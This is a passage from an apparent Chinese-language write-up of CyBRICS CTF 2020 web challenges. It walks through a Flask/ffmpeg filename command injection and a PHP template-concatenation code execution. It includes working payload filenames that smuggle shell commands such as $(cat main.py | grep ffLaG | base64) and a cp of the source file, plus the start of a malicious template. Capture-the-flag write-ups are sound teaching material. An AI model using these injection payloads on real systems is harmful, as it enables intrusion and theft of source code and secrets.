class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'********************************'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">500</span> * <span class="number">1024</span>  <span class="comment"># 500Kb</span></span><br><span class="line">ffLaG = <span class="string">"cybrics&#123;********************************&#125;"</span></span><br><span class="line">Bootstrap(app)</span><br><span class="line">logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            logging.debug(<span class="string">'No file part'</span>)</span><br><span class="line">            flash(<span class="string">'No file part'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            logging.debug(<span class="string">'No selected file'</span>)</span><br><span class="line">            flash(<span class="string">'No selected file'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f'Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid file extension'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.content_type != <span class="string">"image/gif"</span>:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Content type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], file.filename))</span><br><span class="line"></span><br><span class="line">            mime_type = filetype.guess_mime(<span class="string">f'uploads/<span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">if</span> mime_type != <span class="string">"image/gif"</span>:</span><br><span class="line">                logging.debug(<span class="string">f'Invalid Mime type: <span class="subst">&#123;mime_type&#125;</span>'</span>)</span><br><span class="line">                flash(<span class="string">'Mime type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">            uid = str(uuid.uuid4())</span><br><span class="line">            os.mkdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">            logging.debug(<span class="string">f"Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>)</span><br><span class="line"></span><br><span class="line">            command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>, shell=<span class="literal">True</span>)</span><br><span class="line">            command.wait(timeout=<span class="number">15</span>)</span><br><span class="line">            logging.debug(command.stdout)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">'Successfully saved'</span>, <span class="string">'success'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'result'</span>, uid=uid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"form.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result/&lt;uid&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(uid)</span>:</span></span><br><span class="line">    images = []</span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> os.listdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>):</span><br><span class="line">        mime_type = filetype.guess(str(Path(<span class="string">"uploads"</span>) / uid / image))</span><br><span class="line">        <span class="keyword">if</span> image.endswith(<span class="string">".png"</span>) <span class="keyword">and</span> mime_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> mime_type.EXTENSION == <span class="string">"png"</span>:</span><br><span class="line">            images.append(image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>, uid=uid, images=images)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image</span><span class="params">(uid, image)</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    dir = str(Path(app.config[<span class="string">'UPLOAD_FOLDER'</span>]) / uid)</span><br><span class="line">    print(dir)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(dir, image)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(413)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_entity_too_large</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File is too large"</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'localhost'</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>注意到执行ffmpeg有个变量拼接。我们的file.filename可控。不过需要经过前面几层检验。简单看可以发现一方面限制了<br>后缀（取最后一个. 后字符检测是否为gif）另外限制了可用字符。不过这些字符已经够用了。</p><p>首先我的思路是去找ffmpeg的可用flag.通过<code>-h</code>列出一些flag后。我注意到这样几个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-report             generate a report</span><br><span class="line">-filter_script filename  <span class="built_in">read</span> stream filtergraph description from a file</span><br><span class="line">-metadata string=string  add metadata</span><br></pre></td></tr></table></figure><p>这里我主要是寻找跟文件有关的选项。其中report会在当前目录生成一个log文件。filter_script可以读取一个文件内容作为stream filter. -metadata 可以添加一组键值。加入到输出的metadata中。</p><p>不过本地跑起来简单尝试下后。会发现因为我们不可用<code>/</code>字符。所以想要控制路径是做不到的。我们必须要让包含flag的信息输出到uploads的沙盒下。而注意到题目<code>/uploads/{uid}/</code>下的内容并没有像其他两个路由那样做文件类型检查。所以我们是可以直接访问的。</p><p>因此<code>-report</code>无法使用。因为它只能在当前目录生成报告。而<code>-filter_script</code>假如搭配<code>-report</code>倒是可以把读取文件内容时的错误信息输出到日志中。但是因为日志读不了所以也不可行。</p><p>于是我关注点就集中到了<code>-metadata</code>上。我们可以构造这样的命令闭合引号并且执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i <span class="string">'uploads/logo.gif'</span> -metadata language=$(cat main.py| grep ffLaG |base64)  -metadata abc=<span class="string">'.gif'</span> <span class="string">"uploads/&#123;uid&#125;/%03d.png"</span></span><br></pre></td></tr></table></figure><p>从输出结果上看是成功执行命令了的。但是本地测试发现一个问题。输出的png读不到其metadata属性。</p><p>简单的查阅了下文档以及谷歌后我推测应该是因为ffmpeg的metadata选项不支持png.不过文档里我发现视频文件是肯定可以修改增加metadata的。因此当我尝试将上面的命令改为输出成avi后。是可以通过exiftool读取到metadata中的language的。<br><img src="/2020/07/26/CyBRICS-CTF-2020/1.PNG" alt></p><p>那么我们现在只需要一个强迫转换输出类型的flag. 再次查文档发现了<code>-f fmt              force format</code>。<br>所以最终payload如下。我们只需在传好logo.gif后传gif文件并以如下作为文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logo.gif<span class="string">' -metadata language=$(cat main.py| grep ffLaG |base64) -f avi  -metadata abc='</span>.gif</span><br></pre></td></tr></table></figure><p>首先我们保证了结尾最后的<code>.</code>末尾是<code>gif</code>绕过后缀检查。之后执行命令时将会把main.py中的ffLaG变量值保存到输出的language metadata中。本地跑起来的话。会发现在沙盒下最终生成了名为<code>%03d.png</code>的avi类型文件。并且可以用exiftool获取到其metadata。</p><p>本地打通的话去远程打肯定就没问题了。这里打远程时稍微多发了几次包。最终获取到图片并得到flag<br><img src="/2020/07/26/CyBRICS-CTF-2020/2.PNG" alt></p><p>看着这个flag我高度怀疑自己不是预期做的……搞不好可以很简单解决掉。</p><p>ps:<br>佛了。不会就我去看ffmpeg的flags了吧……虽然做法很有趣但是未免太傻了……别人的payload:<br><code>&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gif</code><br>wtcltcl。忘记用pwd拼接目录了。bash script都白写了。</p><h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p>这道题目最主要的就是用代码混淆视线。所以关键在于一定要找到真正可以利用的漏洞代码。<br>首先注意到一个似乎可以利用的地方。在calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!@$_GET[<span class="string">'template'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line">$template = $_GET[<span class="string">'template'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'#^[a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;$#s'</span>, $template)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_file(<span class="string">"calcs/$userid/templates/$template.html"</span>)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'field'</span>])) &#123;</span><br><span class="line">    $field = trim($_POST[<span class="string">'field'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s'</span>, $field)) &#123;</span><br><span class="line">        $value = <span class="string">"BAD"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">            redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $value = <span class="keyword">eval</span>(<span class="string">"return $field;"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">                $value = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($value) &amp;&amp; !is_string($value)) &#123;</span><br><span class="line">                $value = <span class="string">"ERROR"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $value = (string)$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;var preloadValue = "</span> . json_encode($value) . <span class="string">";&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"inc/calclib.html"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">"calcs/$userid/templates/$template.html"</span>;</span><br></pre></td></tr></table></figure><p>第一想法肯定是利用那个eval.不过这里字符实在是太限制了。我很快就发现根本无法构造出<code>INF</code>,<code>NAN</code>以外等等字符并取单。因此得尝试变化思路。</p><p>注意到题目功能。整体上提供了一个假注册登录功能用来记录session.同时允许我们上传新template.我们可以根据calc.php中所传template参数选择template。前往newtemplate.php。发现其限制了我们template的代码中不能含有<code>&lt;?</code>且必须包含它要求的id标签。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'html'</span>])) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $html = trim($_POST[<span class="string">'html'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (strpos($html, <span class="string">'&lt;?'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $error = <span class="string">"Bad chars"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $requiredBlocks = [</span><br><span class="line">            <span class="string">'id="back"'</span>,</span><br><span class="line">            <span class="string">'id="field" name="field"'</span>,</span><br><span class="line">            <span class="string">'id="digit0"'</span>,</span><br><span class="line">            <span class="string">'id="digit1"'</span>,</span><br><span class="line">            <span class="string">'id="digit2"'</span>,</span><br><span class="line">            <span class="string">'id="digit3"'</span>,</span><br><span class="line">            <span class="string">'id="digit4"'</span>,</span><br><span class="line">            <span class="string">'id="digit5"'</span>,</span><br><span class="line">            <span class="string">'id="digit6"'</span>,</span><br><span class="line">            <span class="string">'id="digit7"'</span>,</span><br><span class="line">            <span class="string">'id="digit8"'</span>,</span><br><span class="line">            <span class="string">'id="digit9"'</span>,</span><br><span class="line">            <span class="string">'id="plus"'</span>,</span><br><span class="line">            <span class="string">'id="equals"'</span>,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($requiredBlocks <span class="keyword">as</span> $block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($html, $block) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                $error = <span class="string">"Missing required block: '$block'"</span>;</span><br><span class="line">                <span class="keyword">break</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $uuid = uuid();</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="string">"calcs/$userid/templates/$uuid.html"</span>, $html)) &#123;</span><br><span class="line">            $error = <span class="string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        redir(<span class="string">"."</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="row"&gt;</span><br><span class="line">        &lt;div class="p-5 mx-auto col-10 col-md-10 bg-info"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($error) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;div class="alert alert-danger" role="alert"&gt;</span><br><span class="line">            &lt;button type="button" class="close" data-dismiss="alert"&gt;×&lt;/button&gt;</span><br><span class="line">            &lt;h4 class="alert-heading"&gt;Error&lt;/h4&gt;</span><br><span class="line">            &lt;p class="mb-0"&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;h3 class="display-3"&gt;New template&lt;/h3&gt;</span><br><span class="line">          &lt;div class="px-4 order-1 order-md-2 col-lg-12"&gt;</span><br><span class="line">            &lt;h2 class="mb-4"&gt;Insert code&lt;/h2&gt;</span><br><span class="line">            &lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">              &lt;div class="form-group"&gt; &lt;textarea style="min-height: 100px; font-family: 'Fira Code', Consolas, monospace;" placeholder="HTML" class="form-control form-control-sm" name="html" oninput="this.style.height = ''; this.style.height = (this.scrollHeight + 10) +'px'"&gt;&lt;?=htmlspecialchars(@$_POST['html'])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-lg btn-outline-secondary mx-3 px-3"&gt;&lt;i class="fa fa-plus-square fa-fw fa-1x py-1"&gt;&lt;/i&gt; Create Template&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>然后我们发现。calc.php如果不传递share参数的话。将只是简单的require我们的template.但是倘若传递share.则将进行一个拼接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">    $calc = uuid();</span><br><span class="line">    file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">    redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的变量field与之后的<code>inc/calclib.html</code>，以及自己的template进行拼接。当内容作为file_put_contents的参数写进新的php文件时。<code>&lt;?=</code>总是可用的(即作为echo 调用)那么我们只需要想办法解决掉中间拼接的文件<code>inc/calclib.html</code>即可。通过使用注释符将两者中间的html文件注释掉，并在template中写入恶意代码就能完成</p><p><img src="/2020/07/26/CyBRICS-CTF-2020/3.PNG" alt><br>本地模拟写入的文件。可以看到中间的部分被注释掉。我们只需注意正确闭合括号。<br>payload<br>html内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"field"</span> <span class="attr">name</span>=<span class="string">"field"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit0"</span> <span class="attr">data-append</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit1"</span> <span class="attr">data-append</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit2"</span> <span class="attr">data-append</span>=<span class="string">"2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit3"</span> <span class="attr">data-append</span>=<span class="string">"3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit4"</span> <span class="attr">data-append</span>=<span class="string">"4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit5"</span> <span class="attr">data-append</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit6"</span> <span class="attr">data-append</span>=<span class="string">"6"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit7"</span> <span class="attr">data-append</span>=<span class="string">"7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit8"</span> <span class="attr">data-append</span>=<span class="string">"8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit9"</span> <span class="attr">data-append</span>=<span class="string">"9"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"plus"</span> <span class="attr">data-append</span>=<span class="string">" + "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"minus"</span> <span class="attr">data-append</span>=<span class="string">" - "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"times"</span> <span class="attr">data-append</span>=<span class="string">" * "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"div"</span> <span class="attr">data-append</span>=<span class="string">" / "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"point"</span> <span class="attr">data-append</span>=<span class="string">"."</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"clear"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"back"</span> <span class="attr">value</span>=<span class="string">"← Back"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"share"</span> <span class="attr">name</span>=<span class="string">"share"</span> <span class="attr">value</span>=<span class="string">"Share"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 